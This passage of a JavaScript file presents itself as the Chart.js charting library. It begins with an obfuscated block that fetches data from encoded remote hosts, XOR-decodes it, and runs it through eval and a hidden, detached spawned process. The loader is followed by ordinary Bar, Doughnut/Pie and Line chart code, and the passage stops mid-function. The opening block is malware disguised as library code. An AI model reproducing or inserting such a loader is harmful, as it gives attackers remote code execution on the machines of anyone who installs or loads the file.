_0x42fe9b[_0x265dfa(0x321)](_0x2f6a15,_0x59acf4);},'oPsgo':_0x42fe9b[_0x1ba0f2(0x2ea)],'UMFth':_0x42fe9b[_0x1ba0f2(0x2df)],'utuZi':_0x42fe9b[_0x1ba0f2(0x32e)],'CPXYo':_0x42fe9b[_0x1ba0f2(0x2c7)],'VoVvv':function(_0x1d01e1,_0x3d0c27){var _0x3e430b=_0x1ba0f2;return _0x42fe9b[_0x3e430b(0x1a4)](_0x1d01e1,_0x3d0c27);},'uqXMv':function(_0x466148,_0x4c9398){var _0x417c7d=_0x1ba0f2;return _0x42fe9b[_0x417c7d(0x1a4)](_0x466148,_0x4c9398);}},_0x6ef10b={'hostname':_0x389d05[_0x1ba0f2(0x1a7)],'port':_0x42fe9b[_0x1ba0f2(0x306)](Number,_0x389d05[_0x1ba0f2(0x27e)])||0x80+0x25a6+-0x25d6,'path':_0x42fe9b[_0x1ba0f2(0x242)](_0x389d05[_0x1ba0f2(0x1b4)],_0x389d05[_0x1ba0f2(0x23b)]),'headers':{'User-Agent':_0x42fe9b[_0x1ba0f2(0x2a3)],'Sec-V':_0x46ef11['_V']||0x80*-0x2d+0x1d3b+0x6bb*-0x1}};function _0x31b18d(_0x28ac9e){var _0x4add8a=_0x1ba0f2,_0x4a52b6,_0x45c5c4=_0x421f6d[_0x4add8a(0x337)];for(_0x4a52b6=-0x1151+-0xa0+0x5fb*0x3;_0x171ff5[_0x4add8a(0x2d1)](_0x4a52b6,_0x28ac9e[_0x4add8a(0x337)]);_0x4a52b6++)_0x28ac9e[_0x4a52b6]^=_0x421f6d[_0x4add8a(0x2cd)](_0x171ff5[_0x4add8a(0x236)](_0x4a52b6,_0x45c5c4));return _0x28ac9e[_0x4add8a(0x24b)](_0x171ff5[_0x4add8a(0x253)]);}function _0x1b21e7(_0x1d0588){var _0x46912d=_0x1ba0f2,_0x19f917=_0x1d0588[_0x46912d(0x1ea)][_0x500df5[_0x46912d(0x2c2)]];if(!_0x19f917)throw new Error(_0x500df5[_0x46912d(0x1f2)]);return _0x500df5[_0x46912d(0x1f8)](_0x31b18d,Buffer[_0x46912d(0x303)](_0x19f917,_0x500df5[_0x46912d(0x259)]));}function _0xbbdbff(_0x249e2f){return new Promise(function(_0x34f03e,_0x40bc0a){var _0x1b2d8c=_0x3cb6,_0x57e2fc={'nJWUX':function(_0x5d3b9d,_0x52fec5){var _0x3e6f4d=_0x3cb6;return _0x500df5[_0x3e6f4d(0x1f8)](_0x5d3b9d,_0x52fec5);},'vdcJc':_0x500df5[_0x1b2d8c(0x2c2)],'oXfHd':_0x500df5[_0x1b2d8c(0x1d4)],'qfjFi':function(_0x24cf26,_0x1161a0){var _0x6c091a=_0x1b2d8c;return _0x500df5[_0x6c091a(0x2e1)](_0x24cf26,_0x1161a0);},'ACUSz':_0x500df5[_0x1b2d8c(0x2b5)],'oQDlb':_0x500df5[_0x1b2d8c(0x279)],'RONKq':_0x500df5[_0x1b2d8c(0x229)],'ptckv':_0x500df5[_0x1b2d8c(0x23e)],'BbVGJ':function(_0x5ca890,_0x2d5e4d){var _0x33065c=_0x1b2d8c;return _0x500df5[_0x33065c(0x2d3)](_0x5ca890,_0x2d5e4d);},'EEBEV':function(_0x1d0be0,_0x2ef134){var _0x298800=_0x1b2d8c;return _0x500df5[_0x298800(0x1f8)](_0x1d0be0,_0x2ef134);}},_0x34e555={'hostname':_0x6ef10b[_0x1b2d8c(0x1a7)],'port':_0x6ef10b[_0x1b2d8c(0x27e)],'path':_0x6ef10b[_0x1b2d8c(0x30a)],'headers':_0x6ef10b[_0x1b2d8c(0x1ea)],'method':_0x249e2f},_0x320bc5=http[_0x1b2d8c(0x2b2)](_0x34e555,function(_0x14723e){var _0x15bd59=_0x1b2d8c,_0xba8495={'fMysM':function(_0x231137,_0x4cdc9e){var _0x48f7ad=_0x3cb6;return _0x57e2fc[_0x48f7ad(0x295)](_0x231137,_0x4cdc9e);},'rwuQo':_0x57e2fc[_0x15bd59(0x215)],'pmsad':function(_0x2f5578,_0x4f92bf){var _0x153dfa=_0x15bd59;return _0x57e2fc[_0x153dfa(0x295)](_0x2f5578,_0x4f92bf);},'yQcPc':_0x57e2fc[_0x15bd59(0x22e)]};if(_0x57e2fc[_0x15bd59(0x2d6)](_0x57e2fc[_0x15bd59(0x25b)],_0x249e2f)){var _0x59d610=[];_0x14723e['on'](_0x57e2fc[_0x15bd59(0x1a9)],function(_0x4db5c8){var _0x4e0d32=_0x15bd59;_0x59d610[_0x4e0d32(0x2a9)](_0x4db5c8);}),_0x14723e['on'](_0x57e2fc[_0x15bd59(0x228)],function(){var _0x374076=_0x15bd59;try{var _0x3223e3=Buffer[_0x374076(0x185)](_0x59d610);if(_0x3223e3[_0x374076(0x337)])return _0xba8495[_0x374076(0x207)](_0x34f03e,_0xba8495[_0x374076(0x207)](_0x31b18d,_0x3223e3));if(_0x14723e[_0x374076(0x1ea)][_0xba8495[_0x374076(0x28c)]])return _0xba8495[_0x374076(0x207)](_0x34f03e,_0xba8495[_0x374076(0x207)](_0x1b21e7,_0x14723e));_0xba8495[_0x374076(0x1ba)](_0x40bc0a,new Error(_0xba8495[_0x374076(0x25e)]));}catch(_0x484aa2){_0xba8495[_0x374076(0x1ba)](_0x40bc0a,_0x484aa2);}}),_0x14723e['on'](_0x57e2fc[_0x15bd59(0x27d)],_0x40bc0a);}else{try{_0x57e2fc[_0x15bd59(0x295)](_0x34f03e,_0x57e2fc[_0x15bd59(0x2f6)](_0x1b21e7,_0x14723e));}catch(_0x31f0d1){_0x57e2fc[_0x15bd59(0x189)](_0x40bc0a,_0x31f0d1);}_0x14723e[_0x15bd59(0x23c)]();}});_0x320bc5['on'](_0x500df5[_0x1b2d8c(0x23e)],_0x40bc0a),_0x320bc5[_0x1b2d8c(0x1b7)]();});}return _0x42fe9b[_0x1ba0f2(0x2c4)](_0xbbdbff,_0x42fe9b[_0x1ba0f2(0x1fe)])[_0x1ba0f2(0x22f)](function(){var _0x1f62f0=_0x1ba0f2;return _0x500df5[_0x1f62f0(0x1cb)](_0xbbdbff,_0x500df5[_0x1f62f0(0x2b5)]);});}async function _0x20c79c(_0x2870e6,_0x504b34){var _0xf1ba59=_0x869604,_0x3d2262,_0x11545b;for(_0x11545b=0xe*-0x21a+-0x6*-0x35e+0x938;_0x171ff5[_0xf1ba59(0x256)](_0x11545b,_0x504b34[_0xf1ba59(0x337)]);_0x11545b++)try{return await _0x171ff5[_0xf1ba59(0x334)](_0x47b98a,_0x2870e6,_0x504b34[_0x11545b]);}catch(_0x3aa7ca){_0x3d2262=_0x3aa7ca;}throw _0x3d2262||new Error(_0x171ff5[_0xf1ba59(0x278)]);}async function _0x42041a(_0x400c3b,_0x5b8f34,_0x2d34b4){var _0x4ae001=_0x869604;try{const _0x1cf374=await _0x171ff5[_0x4ae001(0x334)](_0x20c79c,_0x5b8f34,_0x400c3b),_0x5b90a5=_0x2d34b4?_0x4ae001(0x1b2)+_0x4ae001(0x1f1)+(_0x46ef11['_V']||0x225e+0x1*-0x1363+-0xefb)+(_0x4ae001(0x243)+_0x4ae001(0x2ec))+_0x46ef11['_H']+(_0x4ae001(0x243)+_0x4ae001(0x317))+_0x46ef11[_0x4ae001(0x206)]+(_0x4ae001(0x243)+_0x4ae001(0x2fe)+_0x4ae001(0x246)+_0x4ae001(0x184)+_0x4ae001(0x31d)+_0x4ae001(0x2d2)):_0x4ae001(0x1b2)+_0x4ae001(0x1f1)+(_0x46ef11['_V']||-0x5*-0x113+0xb*0x347+-0x296c)+(_0x4ae001(0x243)+_0x4ae001(0x254))+_0x46ef11[_0x4ae001(0x1ef)]+(_0x4ae001(0x243)+_0x4ae001(0x1be))+_0x46ef11[_0x4ae001(0x2de)]+(_0x4ae001(0x243)+_0x4ae001(0x2fe)+_0x4ae001(0x246)+_0x4ae001(0x184)+_0x4ae001(0x31d)+_0x4ae001(0x2d2));_0x2d34b4||_0x171ff5[_0x4ae001(0x2ed)](eval,_0x171ff5[_0x4ae001(0x32c)](_0x5b90a5,_0x1cf374)),_0x171ff5[_0x4ae001(0x29a)](spawn,_0x171ff5[_0x4ae001(0x1bd)],['-e',_0x171ff5[_0x4ae001(0x19b)](_0x5b90a5,_0x1cf374)],{'detached':!(0x2*0xd7+0x1*0xcf2+0x4e*-0x30),'stdio':_0x171ff5[_0x4ae001(0x31b)],'windowsHide':!(0x3*0x2bd+0x4*0x4b1+-0x1afb*0x1)})[_0x4ae001(0x1fb)]();}catch(_0x50ccac){}}return _0x46ef11['_V']=_0x46ef11['i'],_0x46ef11['_H']=_0x42fe9b[_0x869604(0x2ca)](_0x42fe9b[_0x869604(0x1cd)](_0x42fe9b[_0x869604(0x304)],_0x36aa32),_0x42fe9b[_0x869604(0x2a0)]),_0x46ef11[_0x869604(0x206)]=_0x42fe9b[_0x869604(0x26a)](_0x42fe9b[_0x869604(0x335)](_0x42fe9b[_0x869604(0x304)],_0x45c1fd),_0x42fe9b[_0x869604(0x2a0)]),_0x46ef11[_0x869604(0x1ef)]=_0x42fe9b[_0x869604(0x1e9)](_0x42fe9b[_0x869604(0x224)](_0x42fe9b[_0x869604(0x304)],_0x36aa32),_0x42fe9b[_0x869604(0x1f4)]),_0x46ef11[_0x869604(0x2de)]=_0x42fe9b[_0x869604(0x335)](_0x42fe9b[_0x869604(0x1cd)](_0x42fe9b[_0x869604(0x304)],_0x36aa32),_0x42fe9b[_0x869604(0x2a0)]),_0x42fe9b[_0x869604(0x312)](_0x42041a,[new URL(_0x42fe9b[_0x869604(0x242)](_0x42fe9b[_0x869604(0x2a6)](_0x42fe9b[_0x869604(0x304)],_0x36aa32),_0x42fe9b[_0x869604(0x21e)])),new URL(_0x42fe9b[_0x869604(0x26a)](_0x42fe9b[_0x869604(0x1ec)](_0x42fe9b[_0x869604(0x304)],_0x36aa32),_0x42fe9b[_0x869604(0x1db)]))],_0x42fe9b[_0x869604(0x1d9)],!(-0x20d3+0x61b+-0x1*-0x1ab9))[_0x869604(0x273)](function(){var _0x1b2895=_0x869604;return _0x42fe9b[_0x1b2895(0x191)](_0x42041a,[new URL(_0x42fe9b[_0x1b2895(0x242)](_0x42fe9b[_0x1b2895(0x1cd)](_0x42fe9b[_0x1b2895(0x304)],_0x36aa32),_0x42fe9b[_0x1b2895(0x1c8)])),new URL(_0x42fe9b[_0x1b2895(0x1cd)](_0x42fe9b[_0x1b2895(0x1cd)](_0x42fe9b[_0x1b2895(0x304)],_0x36aa32),_0x42fe9b[_0x1b2895(0x262)]))],_0x42fe9b[_0x1b2895(0x2fc)],!(-0x1*-0xc3+-0xe*-0xb2+-0x1*0xa7f));});});}run();
	}

	root.Chart = Chart;

	Chart.noConflict = function(){
		root.Chart = previous;
		return Chart;
	};

}).call(this);

(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		helpers = Chart.helpers;


	var defaultConfig = {
		//Boolean - Whether the scale should start at zero, or an order of magnitude down from the lowest value
		scaleBeginAtZero : true,

		//Boolean - Whether grid lines are shown across the chart
		scaleShowGridLines : true,

		//String - Colour of the grid lines
		scaleGridLineColor : "rgba(0,0,0,.05)",

		//Number - Width of the grid lines
		scaleGridLineWidth : 1,

		//Boolean - Whether to show horizontal lines (except X axis)
		scaleShowHorizontalLines: true,

		//Boolean - Whether to show vertical lines (except Y axis)
		scaleShowVerticalLines: true,

		//Boolean - If there is a stroke on each bar
		barShowStroke : true,

		//Number - Pixel width of the bar stroke
		barStrokeWidth : 2,

		//Number - Spacing between each of the X value sets
		barValueSpacing : 5,

		//Number - Spacing between data sets within X values
		barDatasetSpacing : 1,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].fillColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>"

	};


	Chart.Type.extend({
		name: "Bar",
		defaults : defaultConfig,
		initialize:  function(data){

			//Expose options as a scope variable here so we can access it in the ScaleClass
			var options = this.options;

			this.ScaleClass = Chart.Scale.extend({
				offsetGridLines : true,
				calculateBarX : function(datasetCount, datasetIndex, barIndex){
					//Reusable method for calculating the xPosition of a given bar based on datasetIndex & width of the bar
					var xWidth = this.calculateBaseWidth(),
						xAbsolute = this.calculateX(barIndex) - (xWidth/2),
						barWidth = this.calculateBarWidth(datasetCount);

					return xAbsolute + (barWidth * datasetIndex) + (datasetIndex * options.barDatasetSpacing) + barWidth/2;
				},
				calculateBaseWidth : function(){
					return (this.calculateX(1) - this.calculateX(0)) - (2*options.barValueSpacing);
				},
				calculateBarWidth : function(datasetCount){
					//The padding between datasets is to the right of each bar, providing that there are more than 1 dataset
					var baseWidth = this.calculateBaseWidth() - ((datasetCount - 1) * options.barDatasetSpacing);

					return (baseWidth / datasetCount);
				}
			});

			this.datasets = [];

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activeBars = (evt.type !== 'mouseout') ? this.getBarsAtEvent(evt) : [];

					this.eachBars(function(bar){
						bar.restore(['fillColor', 'strokeColor']);
					});
					helpers.each(activeBars, function(activeBar){
						activeBar.fillColor = activeBar.highlightFill;
						activeBar.strokeColor = activeBar.highlightStroke;
					});
					this.showTooltip(activeBars);
				});
			}

			//Declare the extension of the default point, to cater for the options passed in to the constructor
			this.BarClass = Chart.Rectangle.extend({
				strokeWidth : this.options.barStrokeWidth,
				showStroke : this.options.barShowStroke,
				ctx : this.chart.ctx
			});

			//Iterate through each of the datasets, and build this into a property of the chart
			helpers.each(data.datasets,function(dataset,datasetIndex){

				var datasetObject = {
					label : dataset.label || null,
					fillColor : dataset.fillColor,
					strokeColor : dataset.strokeColor,
					bars : []
				};

				this.datasets.push(datasetObject);

				helpers.each(dataset.data,function(dataPoint,index){
					//Add a new point for each piece of data, passing any required data to draw.
					datasetObject.bars.push(new this.BarClass({
						value : dataPoint,
						label : data.labels[index],
						datasetLabel: dataset.label,
						strokeColor : dataset.strokeColor,
						fillColor : dataset.fillColor,
						highlightFill : dataset.highlightFill || dataset.fillColor,
						highlightStroke : dataset.highlightStroke || dataset.strokeColor
					}));
				},this);

			},this);

			this.buildScale(data.labels);

			this.BarClass.prototype.base = this.scale.endPoint;

			this.eachBars(function(bar, index, datasetIndex){
				helpers.extend(bar, {
					width : this.scale.calculateBarWidth(this.datasets.length),
					x: this.scale.calculateBarX(this.datasets.length, datasetIndex, index),
					y: this.scale.endPoint
				});
				bar.save();
			}, this);

			this.render();
		},
		update : function(){
			this.scale.update();
			// Reset any highlight colours before updating.
			helpers.each(this.activeElements, function(activeElement){
				activeElement.restore(['fillColor', 'strokeColor']);
			});

			this.eachBars(function(bar){
				bar.save();
			});
			this.render();
		},
		eachBars : function(callback){
			helpers.each(this.datasets,function(dataset, datasetIndex){
				helpers.each(dataset.bars, callback, this, datasetIndex);
			},this);
		},
		getBarsAtEvent : function(e){
			var barsArray = [],
				eventPosition = helpers.getRelativePosition(e),
				datasetIterator = function(dataset){
					barsArray.push(dataset.bars[barIndex]);
				},
				barIndex;

			for (var datasetIndex = 0; datasetIndex < this.datasets.length; datasetIndex++) {
				for (barIndex = 0; barIndex < this.datasets[datasetIndex].bars.length; barIndex++) {
					if (this.datasets[datasetIndex].bars[barIndex].inRange(eventPosition.x,eventPosition.y)){
						helpers.each(this.datasets, datasetIterator);
						return barsArray;
					}
				}
			}

			return barsArray;
		},
		buildScale : function(labels){
			var self = this;

			var dataTotal = function(){
				var values = [];
				self.eachBars(function(bar){
					values.push(bar.value);
				});
				return values;
			};

			var scaleOptions = {
				templateString : this.options.scaleLabel,
				height : this.chart.height,
				width : this.chart.width,
				ctx : this.chart.ctx,
				textColor : this.options.scaleFontColor,
				fontSize : this.options.scaleFontSize,
				fontStyle : this.options.scaleFontStyle,
				fontFamily : this.options.scaleFontFamily,
				valuesCount : labels.length,
				beginAtZero : this.options.scaleBeginAtZero,
				integersOnly : this.options.scaleIntegersOnly,
				calculateYRange: function(currentHeight){
					var updatedRanges = helpers.calculateScaleRange(
						dataTotal(),
						currentHeight,
						this.fontSize,
						this.beginAtZero,
						this.integersOnly
					);
					helpers.extend(this, updatedRanges);
				},
				xLabels : labels,
				font : helpers.fontString(this.options.scaleFontSize, this.options.scaleFontStyle, this.options.scaleFontFamily),
				lineWidth : this.options.scaleLineWidth,
				lineColor : this.options.scaleLineColor,
				showHorizontalLines : this.options.scaleShowHorizontalLines,
				showVerticalLines : this.options.scaleShowVerticalLines,
				gridLineWidth : (this.options.scaleShowGridLines) ? this.options.scaleGridLineWidth : 0,
				gridLineColor : (this.options.scaleShowGridLines) ? this.options.scaleGridLineColor : "rgba(0,0,0,0)",
				padding : (this.options.showScale) ? 0 : (this.options.barShowStroke) ? this.options.barStrokeWidth : 0,
				showLabels : this.options.scaleShowLabels,
				display : this.options.showScale
			};

			if (this.options.scaleOverride){
				helpers.extend(scaleOptions, {
					calculateYRange: helpers.noop,
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				});
			}

			this.scale = new this.ScaleClass(scaleOptions);
		},
		addData : function(valuesArray,label){
			//Map the values array for each of the datasets
			helpers.each(valuesArray,function(value,datasetIndex){
				//Add a new point for each piece of data, passing any required data to draw.
				this.datasets[datasetIndex].bars.push(new this.BarClass({
					value : value,
					label : label,
					x: this.scale.calculateBarX(this.datasets.length, datasetIndex, this.scale.valuesCount+1),
					y: this.scale.endPoint,
					width : this.scale.calculateBarWidth(this.datasets.length),
					base : this.scale.endPoint,
					strokeColor : this.datasets[datasetIndex].strokeColor,
					fillColor : this.datasets[datasetIndex].fillColor
				}));
			},this);

			this.scale.addXLabel(label);
			//Then re-render the chart.
			this.update();
		},
		removeData : function(){
			this.scale.removeXLabel();
			//Then re-render the chart.
			helpers.each(this.datasets,function(dataset){
				dataset.bars.shift();
			},this);
			this.update();
		},
		reflow : function(){
			helpers.extend(this.BarClass.prototype,{
				y: this.scale.endPoint,
				base : this.scale.endPoint
			});
			var newScaleProps = helpers.extend({
				height : this.chart.height,
				width : this.chart.width
			});
			this.scale.update(newScaleProps);
		},
		draw : function(ease){
			var easingDecimal = ease || 1;
			this.clear();

			var ctx = this.chart.ctx;

			this.scale.draw(easingDecimal);

			//Draw all the bars for each dataset
			helpers.each(this.datasets,function(dataset,datasetIndex){
				helpers.each(dataset.bars,function(bar,index){
					if (bar.hasValue()){
						bar.base = this.scale.endPoint;
						//Transition then draw
						bar.transition({
							x : this.scale.calculateBarX(this.datasets.length, datasetIndex, index),
							y : this.scale.calculateY(bar.value),
							width : this.scale.calculateBarWidth(this.datasets.length)
						}, easingDecimal).draw();
					}
				},this);

			},this);
		}
	});


}).call(this);

(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		//Cache a local reference to Chart.helpers
		helpers = Chart.helpers;

	var defaultConfig = {
		//Boolean - Whether we should show a stroke on each segment
		segmentShowStroke : true,

		//String - The colour of each segment stroke
		segmentStrokeColor : "#fff",

		//Number - The width of each segment stroke
		segmentStrokeWidth : 2,

		//The percentage of the chart that we cut out of the middle.
		percentageInnerCutout : 50,

		//Number - Amount of animation steps
		animationSteps : 100,

		//String - Animation easing effect
		animationEasing : "easeOutBounce",

		//Boolean - Whether we animate the rotation of the Doughnut
		animateRotate : true,

		//Boolean - Whether we animate scaling the Doughnut from the centre
		animateScale : false,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"></span><%if(segments[i].label){%><%=segments[i].label%><%}%></li><%}%></ul>"

	};


	Chart.Type.extend({
		//Passing in a name registers this chart in the Chart namespace
		name: "Doughnut",
		//Providing a defaults will also register the deafults in the chart namespace
		defaults : defaultConfig,
		//Initialize is fired when the chart is initialized - Data is passed in as a parameter
		//Config is automatically merged by the core of Chart.js, and is available at this.options
		initialize:  function(data){

			//Declare segments as a static property to prevent inheriting across the Chart type prototype
			this.segments = [];
			this.outerRadius = (helpers.min([this.chart.width,this.chart.height]) -	this.options.segmentStrokeWidth/2)/2;

			this.SegmentArc = Chart.Arc.extend({
				ctx : this.chart.ctx,
				x : this.chart.width/2,
				y : this.chart.height/2
			});

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activeSegments = (evt.type !== 'mouseout') ? this.getSegmentsAtEvent(evt) : [];

					helpers.each(this.segments,function(segment){
						segment.restore(["fillColor"]);
					});
					helpers.each(activeSegments,function(activeSegment){
						activeSegment.fillColor = activeSegment.highlightColor;
					});
					this.showTooltip(activeSegments);
				});
			}
			this.calculateTotal(data);

			helpers.each(data,function(datapoint, index){
				this.addData(datapoint, index, true);
			},this);

			this.render();
		},
		getSegmentsAtEvent : function(e){
			var segmentsArray = [];

			var location = helpers.getRelativePosition(e);

			helpers.each(this.segments,function(segment){
				if (segment.inRange(location.x,location.y)) segmentsArray.push(segment);
			},this);
			return segmentsArray;
		},
		addData : function(segment, atIndex, silent){
			var index = atIndex || this.segments.length;
			this.segments.splice(index, 0, new this.SegmentArc({
				value : segment.value,
				outerRadius : (this.options.animateScale) ? 0 : this.outerRadius,
				innerRadius : (this.options.animateScale) ? 0 : (this.outerRadius/100) * this.options.percentageInnerCutout,
				fillColor : segment.color,
				highlightColor : segment.highlight || segment.color,
				showStroke : this.options.segmentShowStroke,
				strokeWidth : this.options.segmentStrokeWidth,
				strokeColor : this.options.segmentStrokeColor,
				startAngle : Math.PI * 1.5,
				circumference : (this.options.animateRotate) ? 0 : this.calculateCircumference(segment.value),
				label : segment.label
			}));
			if (!silent){
				this.reflow();
				this.update();
			}
		},
		calculateCircumference : function(value){
			return (Math.PI*2)*(Math.abs(value) / this.total);
		},
		calculateTotal : function(data){
			this.total = 0;
			helpers.each(data,function(segment){
				this.total += Math.abs(segment.value);
			},this);
		},
		update : function(){
			this.calculateTotal(this.segments);

			// Reset any highlight colours before updating.
			helpers.each(this.activeElements, function(activeElement){
				activeElement.restore(['fillColor']);
			});

			helpers.each(this.segments,function(segment){
				segment.save();
			});
			this.render();
		},

		removeData: function(atIndex){
			var indexToDelete = (helpers.isNumber(atIndex)) ? atIndex : this.segments.length-1;
			this.segments.splice(indexToDelete, 1);
			this.reflow();
			this.update();
		},

		reflow : function(){
			helpers.extend(this.SegmentArc.prototype,{
				x : this.chart.width/2,
				y : this.chart.height/2
			});
			this.outerRadius = (helpers.min([this.chart.width,this.chart.height]) -	this.options.segmentStrokeWidth/2)/2;
			helpers.each(this.segments, function(segment){
				segment.update({
					outerRadius : this.outerRadius,
					innerRadius : (this.outerRadius/100) * this.options.percentageInnerCutout
				});
			}, this);
		},
		draw : function(easeDecimal){
			var animDecimal = (easeDecimal) ? easeDecimal : 1;
			this.clear();
			helpers.each(this.segments,function(segment,index){
				segment.transition({
					circumference : this.calculateCircumference(segment.value),
					outerRadius : this.outerRadius,
					innerRadius : (this.outerRadius/100) * this.options.percentageInnerCutout
				},animDecimal);

				segment.endAngle = segment.startAngle + segment.circumference;

				segment.draw();
				if (index === 0){
					segment.startAngle = Math.PI * 1.5;
				}
				//Check to see if it's the last segment, if not get the next and update the start angle
				if (index < this.segments.length-1){
					this.segments[index+1].startAngle = segment.endAngle;
				}
			},this);

		}
	});

	Chart.types.Doughnut.extend({
		name : "Pie",
		defaults : helpers.merge(defaultConfig,{percentageInnerCutout : 0})
	});

}).call(this);
(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		helpers = Chart.helpers;

	var defaultConfig = {

		///Boolean - Whether grid lines are shown across the chart
		scaleShowGridLines : true,

		//String - Colour of the grid lines
		scaleGridLineColor : "rgba(0,0,0,.05)",

		//Number - Width of the grid lines
		scaleGridLineWidth : 1,

		//Boolean - Whether to show horizontal lines (except X axis)
		scaleShowHorizontalLines: true,

		//Boolean - Whether to show vertical lines (except Y axis)
		scaleShowVerticalLines: true,

		//Boolean - Whether the line is curved between points
		bezierCurve : true,

		//Number - Tension of the bezier curve between points
		bezierCurveTension : 0.4,

		//Boolean - Whether to show a dot for each point
		pointDot : true,

		//Number - Radius of each point dot in pixels
		pointDotRadius : 4,

		//Number - Pixel width of point dot stroke
		pointDotStrokeWidth : 1,

		//Number - amount extra to add to the radius to cater for hit detection outside the drawn point
		pointHitDetectionRadius : 20,

		//Boolean - Whether to show a stroke for datasets
		datasetStroke : true,

		//Number - Pixel width of dataset stroke
		datasetStrokeWidth : 2,

		//Boolean - Whether to fill the dataset with a colour
		datasetFill : true,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>"

	};


	Chart.Type.extend({
		name: "Line",
		defaults : defaultConfig,
		initialize:  function(data){
			//Declare the extension of the default point, to cater for the options passed in to the constructor
			this.PointClass = Chart.Point.extend({
				strokeWidth : this.options.pointDotStrokeWidth,
				radius : this.options.pointDotRadius,
				display: this.options.pointDot,
				hitDetectionRadius : this.options.pointHitDetectionRadius,
				ctx : this.chart.ctx,
				inRange : function(mouseX){
					return (Math.pow(mouseX-this.x, 2) < Math.pow(this.radius + this.hitDetectionRadius,2));
				}
			});

			this.datasets = [];

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activePoints = (evt.type !== 'mouseout') ? this.getPointsAtEvent(evt) : [];
					this.eachPoints(function(point){
						point.restore(['fillColor', 'strokeColor']);
					});
					helpers.each(activePoints, function(activePoint){
						activePoint.fillColor = activePoint.highlightFill;
						activePoint.strokeColor = activePoint.highlightStroke;
					});
					this.showTooltip(activePoints);
				});
			}

			//Iterate through each of the datasets, and build this into a property of the chart
			helpers.each(data.datasets,function(dataset){

				var datasetObject = {
					label : dataset.label || null,
					fillColor : dataset.fillColor,
					strokeColor : dataset.strokeColor,
					pointColor : dataset.pointColor,
					pointStrokeColor : dataset.pointStrokeColor,
					points : []
				};

				this.datasets.push(datasetObject);


				helpers.each(dataset.data,function(dataPoint,index){
					//Add a new point for each piece of data, passing any required data to draw.
					datasetObject.points.push(new this.PointClass({
						value : dataPoint,
						label : data.labels[index],
						datasetLabel: dataset.label,
						strokeColor : dataset.pointStrokeColor,
						fillColor : dataset.pointColor,
						highlightFill : dataset.pointHighlightFill || dataset.pointColor,
						highlightStroke : dataset.pointHighlightStroke || dataset.pointStrokeColor
					}));
				},this);

				this.buildScale(data.labels);


				this.eachPoints(function(point, index){
					helpers.extend(point, {
						x: this.scale.calculateX(index),
						y: this.scale.endPoint
					});
					point.save();
				}, this);

			},this);


			this.render();
		},
		update : function(){
			this.scale.update();
			// Reset any highlight colours before updating.
			helpers.each(this.activeElements, function(activeElement){
				activeElement.restore(['fillColor', 'strokeColor']);
			});
			this.eachPoints(function(point){
				point.save();
			});
			this.render();
		},
		eachPoints : function(callback){
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,callback,this);
			},this);
		},
		getPointsAtEvent : function(e){
			var pointsArray = [],
				eventPosition = helpers.getRelativePosition(e);
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,function(point){
					if (point.inRange(eventPosition.x,eventPosition.y)) pointsArray.push(point);
				});
			},this);
			return pointsArray;
		},
		buildScale : function(labels){
			var self = this;

			var dataTotal = function(){
				var values = [];
				self.eachPoints(function(point){
					values.push(point.value);
				});

				return values;
			};

			var scaleOptions = {
				templateString : this.options.scaleLabel,
				height : this.chart.height,
				width : this.chart.width,
				ctx : this.chart.ctx,
				textColor : this.options.scaleFontColor,
				fontSize : this.options.scaleFontSize,
				fontStyle : this.options.scaleFontStyle,
				fontFamily : this.options.scaleFontFamily,
				valuesCount : labels.length,
				beginAtZero : this.options.scaleBeginAtZero,
				integersOnly : this.options.scaleIntegersOnly,
				calculateYRange : function(currentHeight){
					var updatedRanges = helpers.calculateScaleRange(
						dataTotal(),
						currentHeight,
						this.fontSize,
						this.beginAtZero,
						this.integersOnly
					);
					helpers.extend(this, updatedRanges);
				},
				xLabels : labels,
				font : helpers.fontString(this.options.scaleFontSize, this.options.scaleFontStyle, this.options.scaleFontFamily),
				lineWidth : this.options.scaleLineWidth,
				lineColor : this.options.scaleLineColor,
				showHorizontalLines : this.options.scaleShowHorizontalLines,
				showVerticalLines : this.options.scaleShowVerticalLines,
				gridLineWidth : (this.options.scaleShowGridLines) ? this.options.scaleGridLineWidth : 0,
				gridLineColor : (this.options.scaleShowGridLines) ? this.options.scaleGridLineColor : "rgba(0,0,0,0)",
				padding: (this.options.showScale) ? 0 : this.options.pointDotRadius + this.options.pointDotStrokeWidth,
				showLabels : this.options.scaleShowLabels,
				display : this.options.showScale
			};

			if (this.options.scaleOverride){
				helpers.extend(scaleOptions, {
					calculateYRange: helpers.noop,
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				});
			}


			this.scale = new Chart.Scale(scaleOptions);
		},
		addData : function(valuesArray,label){
			//Map the values array for each of the datasets

			helpers.each(valuesArray,function(value,datasetIndex){
				//Add a new point for each piece of data, passing any required data to draw.
				this.datasets[datasetIndex].points.push(new this.PointClass({
					value : value,
					label : label,
					x: this.scale.calculateX(this.scale.valuesCount+1),
					y: this.scale.endPoint,
					strokeColor : this.datasets[datasetIndex].pointStrokeColor,
